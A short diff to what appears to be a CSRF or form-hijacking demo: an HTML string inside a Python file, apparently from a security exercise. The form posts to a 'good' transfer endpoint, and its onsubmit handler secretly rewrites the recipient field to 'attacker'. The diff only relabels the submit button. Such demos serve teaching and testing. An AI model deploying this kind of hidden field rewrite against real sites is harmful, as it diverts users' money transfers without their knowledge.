@@ -8,7 +8,7 @@ html = """
 <form method='post' action='http://good:5000/transfer' onsubmit=document.getElementById('to').value="attacker"><p>
 Amount:<input name='amount'><p>
 To:<input name='to' id='to'>
-<input type=submit>
+<input type=submit value='transfer'>
 </form>
 </body></html>
 """
